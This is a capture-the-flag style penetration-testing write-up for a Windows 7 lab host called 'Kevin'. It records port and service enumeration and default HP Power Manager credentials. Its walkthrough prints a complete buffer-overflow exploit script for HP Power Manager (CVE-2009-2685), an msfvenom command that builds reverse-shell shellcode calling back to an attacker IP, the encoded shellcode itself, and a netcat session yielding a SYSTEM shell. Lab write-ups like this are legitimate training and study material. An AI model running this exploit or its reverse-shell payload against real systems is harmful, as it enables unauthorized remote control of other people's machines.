# Kevin
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [HTTP](#http)
    * [RPC](#rpc)
    * [NetBIOS](#netbios)
    * [SMB](#smb)
    * [RDP](#rdp)
  * [OS](#os)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing) 
    * [Default Credentials](#default-credentials)
  * [CVE-2009-2685](#cve-2009-2685) 
    * [EDB-ID-10099](#edb-id-10099)
  * [CVE-2017-0143](#cve-2017-0143)
    * [worawit POC](#worawit-poc)
  * [CVE-2009-3999](#cve-2009-3999)
    * [muhammd POC](#muhammd-poc)
* [Explore](#explore)
* [Escalate](#escalate)
* [Lessons Learned](#lessons-learned)
* [Walkthrough](#walkthrough)

## Summary
* Hostname: kevin (ref: nbtscan)
* IP address: 192.168.103.45
* MAC address: 00:50:56:bf:54:13 (ref: nbtscan)
* Domain: WORKGROUP
* TCP Ports and Services
  * 80
  * 135
  * 139
  * 445
  * 3389
  * 3573
* OS
  * Distro: Windows 7 Ultimate N (ref: rdesktop, worawit checker)
  * Kernel: 6.1.7600 N/A Build 7600 (ref: systeminfo via post-exploitation)
  * Architecture: x86 (ref: systeminfo via post-exploitation)
* Users (ref: net user via post-exploitation)
  * administrator
  * kevin
* Vulnerabilities and Exploits
  * CVE-2009-3999
    * muhammd POC
* Flag
  * b4680e5a2895f96af1a8b3b88ec42859
* Hints
  * n/a

# Enumerate
Setup.
```bash
TARGET=192.168.103.45
NAME=kevin
new-ctf $NAME
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-28 22:12 EDT
Nmap scan report for 192.168.103.45
Host is up (0.12s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         GoAhead WebServer
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.52 seconds
```

## Services
### HTTP
```bash
dirb http://$TARGET -r -z10 -o scans/$NAME-dirb-common

# output

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jun 28 22:56:28 2021
URL_BASE: http://192.168.103.45/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.103.45/ ----
+ http://192.168.103.45/cgi-bin (CODE:200|SIZE:193)                                                                                   
+ http://192.168.103.45/cgi-bin/ (CODE:200|SIZE:209)                                                                                  
+ http://192.168.103.45/cgi-bin2 (CODE:200|SIZE:194)                                                                                  
+ http://192.168.103.45/contents (CODE:302|SIZE:209)                                                                                  
                                                                                                                                      
(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)
                                                                               
-----------------
END_TIME: Mon Jun 28 23:05:52 2021
DOWNLOADED: 1637 - FOUND: 4
```
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig

# output
NSTR
```
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-script-http-shellshock

# output
NSTR
```

### RPC
```bash
rpcclient -U '' $TARGET

# output
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.103.45

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.103.45   KEVIN            <server>  <unknown>        00:50:56:bf:54:13
```

### SMB
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.103.45 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
```bash
smbmap -H $TARGET

# output
[+] IP: 192.168.103.45:445      Name: 192.168.103.45 
```
```bash
# check if vulnerable to EternalBlue
sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-28 22:41 EDT
Nmap scan report for 192.168.103.45
Host is up (0.11s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 5.84 seconds
```

### RDP
```bash
sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-script-rdp-ntlm-info

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-28 22:19 EDT
Nmap scan report for 192.168.103.45
Host is up (0.10s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds
```
```bash
rdesktop -u administrator $TARGET

# output
# Windows 7 Ultimate N
```

## OS
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os

# output
NSTR
```
```bash
sudo nmap $TARGET -p445 --script smb-os-discovery -oN scans/$NAME-nmap-os-smb

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-28 22:53 EDT
Nmap scan report for 192.168.103.45
Host is up (0.11s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-28T19:53:40-07:00

Nmap done: 1 IP address (1 host up) scanned in 2.39 seconds
```

# Exploit
## Password Guessing
### Default Credentials
This worked!
```bash
# HP Power Manager
# admin:admin
```

## CVE-2009-2685
This CVE is applicable (apparently).

### EDB-ID-10099
This did not work at first, but after finding a different exploit I realized I did not modify the script or change the reverse shell port (I used 443, the exploit uses 4444; I also may have used the wrong reverse shell IP address). See walkthrough below for more information.
```bash
searchsploit hp power manager
mkdir edb-id-10099
cd edb-id-10099
searchsploit -x 10099
python 10099.py 192.168.103.45

# output
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
HTTP/1.0 200 OK

[+] Done!
[*] Check your shell at 192.168.103.45:4444 , can take up to 1 min to spawn your shell
```

## CVE-2017-0143
The target is vulnerable, but the exploit below did not work. The exploit requires access to a Named Pipe.

### worawit POC
This did not work.
```bash
mkdir worawit-poc
cd worawit-poc
git clone https://github.com/worawit/MS17-010
cd MS17-010
python checker.py 192.168.103.45

# output
Target OS: Windows 7 Ultimate N 7600
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```

## CVE-2009-3999
### muhammd POC
This worked!
```bash
mkdir muhammad-poc
cd muhammad-poc
git clone https://github.com/Muhammd/HP-Power-Manager.git
cd HP-Power-Manager
python hpm_exploit.py 192.169.103.45
whoami
cd C:\Users\Administrator\Desktop
type proof.txt
```

# Explore
NSTR

# Escalate
NSTR

# Lessons Learned
* Back in 2004, the European Commission fined Microsoft a record €497m under an antitrust ruling. The Commission concluded that with a near-monopoly in the operating system market, Microsoft's bundling of Windows Media Player within Windows was anti-competitive. Microsoft was forced to unbundle the software and offer European consumers and manufacturers a version of Windows without it. Microsoft was allowed to keep selling Windows with a media player, under the condition that it at least offer a version without. Fast-forward to today, and a Microsoft spokesperson explained to CNET UK, "The European Commission's 2004 decision requires Microsoft to offer an N version of Windows in Europe (https://www.cnet.com/news/windows-7-n-the-n-editions-explained/).
* Modifying exploits may be necessary - remmeber to use the right port/address!

# Walkthrough
Next, we need to change the shellcode to a reverse shell while also keeping in mind the egg n00bn00b at the beginning of the shellcode as well as the bad characters to avoid. To generate the shellcode, we will use the following.
```bash
root@kali:~# msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.118.3 LPORT=443
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 710 (iteration=0)
x86/alpha_mixed chosen with final size 710
Payload size: 710 bytes
Final size of c file: 3008 bytes
unsigned char buf[] = 
"\x89\xe2\xd9\xc6\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"

*snip*
```
The complete exploit code looks like the following.
```python
#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes:
# [*] msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.118.3 LPORT=443
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
SHELL = (
"n00bn00b"
"\x89\xe6\xdb\xdd\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x59\x6c\x58\x68\x4f\x72\x55\x50\x77\x70\x75\x50\x31\x70\x4f"
"\x79\x59\x75\x46\x51\x6f\x30\x33\x54\x4c\x4b\x50\x50\x46\x50"
"\x6e\x6b\x56\x32\x64\x4c\x4e\x6b\x43\x62\x66\x74\x4c\x4b\x44"
"\x32\x74\x68\x56\x6f\x48\x37\x43\x7a\x77\x56\x65\x61\x6b\x4f"
"\x6e\x4c\x57\x4c\x73\x51\x53\x4c\x36\x62\x36\x4c\x65\x70\x5a"
"\x61\x7a\x6f\x34\x4d\x33\x31\x6a\x67\x39\x72\x38\x72\x30\x52"
"\x76\x37\x6c\x4b\x71\x42\x62\x30\x6e\x6b\x51\x5a\x35\x6c\x4e"
"\x6b\x42\x6c\x62\x31\x43\x48\x7a\x43\x47\x38\x46\x61\x5a\x71"
"\x36\x31\x4c\x4b\x30\x59\x65\x70\x37\x71\x58\x53\x6e\x6b\x72"
"\x69\x62\x38\x58\x63\x36\x5a\x52\x69\x4e\x6b\x57\x44\x4e\x6b"
"\x66\x61\x79\x46\x74\x71\x69\x6f\x4e\x4c\x4a\x61\x48\x4f\x74"
"\x4d\x46\x61\x68\x47\x30\x38\x4b\x50\x44\x35\x58\x76\x43\x33"
"\x71\x6d\x49\x68\x75\x6b\x31\x6d\x34\x64\x51\x65\x4a\x44\x30"
"\x58\x6c\x4b\x31\x48\x34\x64\x63\x31\x38\x53\x42\x46\x6c\x4b"
"\x44\x4c\x62\x6b\x6c\x4b\x52\x78\x67\x6c\x77\x71\x6b\x63\x6e"
"\x6b\x53\x34\x4e\x6b\x43\x31\x78\x50\x6e\x69\x63\x74\x31\x34"
"\x57\x54\x61\x4b\x31\x4b\x35\x31\x71\x49\x53\x6a\x43\x61\x6b"
"\x4f\x4b\x50\x71\x4f\x53\x6f\x62\x7a\x6e\x6b\x67\x62\x58\x6b"
"\x6e\x6d\x73\x6d\x63\x58\x65\x63\x55\x62\x75\x50\x47\x70\x63"
"\x58\x31\x67\x74\x33\x70\x32\x51\x4f\x72\x74\x52\x48\x30\x4c"
"\x33\x47\x55\x76\x56\x67\x69\x6f\x68\x55\x4f\x48\x6c\x50\x37"
"\x71\x57\x70\x73\x30\x64\x69\x68\x44\x51\x44\x36\x30\x61\x78"
"\x65\x79\x6b\x30\x42\x4b\x55\x50\x69\x6f\x59\x45\x52\x70\x52"
"\x70\x32\x70\x50\x50\x73\x70\x72\x70\x67\x30\x46\x30\x31\x78"
"\x59\x7a\x76\x6f\x4b\x6f\x59\x70\x39\x6f\x49\x45\x7a\x37\x31"
"\x7a\x55\x55\x75\x38\x4b\x70\x4d\x78\x73\x46\x63\x33\x45\x38"
"\x44\x42\x35\x50\x75\x51\x6f\x4b\x6b\x39\x4a\x46\x53\x5a\x54"
"\x50\x30\x56\x76\x37\x31\x78\x6e\x79\x6c\x65\x54\x34\x53\x51"
"\x49\x6f\x58\x55\x4c\x45\x59\x50\x54\x34\x64\x4c\x6b\x4f\x70"
"\x4e\x36\x68\x34\x35\x38\x6c\x73\x58\x4c\x30\x6f\x45\x4c\x62"
"\x76\x36\x4b\x4f\x38\x55\x73\x58\x31\x73\x50\x6d\x30\x64\x63"
"\x30\x6f\x79\x39\x73\x53\x67\x76\x37\x76\x37\x35\x61\x6c\x36"
"\x43\x5a\x74\x52\x51\x49\x52\x76\x78\x62\x79\x6d\x71\x76\x39"
"\x57\x70\x44\x71\x34\x75\x6c\x67\x71\x67\x71\x4c\x4d\x31\x54"
"\x34\x64\x46\x70\x6f\x36\x57\x70\x37\x34\x61\x44\x32\x70\x43"
"\x66\x51\x46\x33\x66\x42\x66\x51\x46\x62\x6e\x31\x46\x76\x36"
"\x50\x53\x76\x36\x42\x48\x54\x39\x7a\x6c\x65\x6f\x6c\x46\x49"
"\x6f\x78\x55\x4d\x59\x6b\x50\x50\x4e\x30\x56\x61\x56\x79\x6f"
"\x46\x50\x65\x38\x73\x38\x4b\x37\x37\x6d\x63\x50\x39\x6f\x69"
"\x45\x6d\x6b\x38\x70\x6e\x55\x4c\x62\x33\x66\x72\x48\x69\x36"
"\x4c\x55\x4f\x4d\x4d\x4d\x69\x6f\x68\x55\x65\x6c\x55\x56\x73"
"\x4c\x76\x6a\x4d\x50\x49\x6b\x49\x70\x33\x45\x53\x35\x4f\x4b"
"\x67\x37\x75\x43\x64\x32\x42\x4f\x71\x7a\x37\x70\x50\x53\x59"
"\x6f\x4b\x65\x41\x41")

EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()
```

Now we can set up a netcat listener on port 443 and then launch the python exploit against the target.
```bash
root@kali:~# python exploit.py 192.168.120.91
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
HTTP/1.0 200 OK

[+] Done!
[*] Check your shell at 192.168.120.91:4444 , can take up to 1 min to spawn your shell
root@kali:~#
```

After a few seconds of waiting, we should get our reverse shell.
```bash
root@kali:~# nc -lvp 443
listening on [any] 443 ...
192.168.120.91: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.91] 49170
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
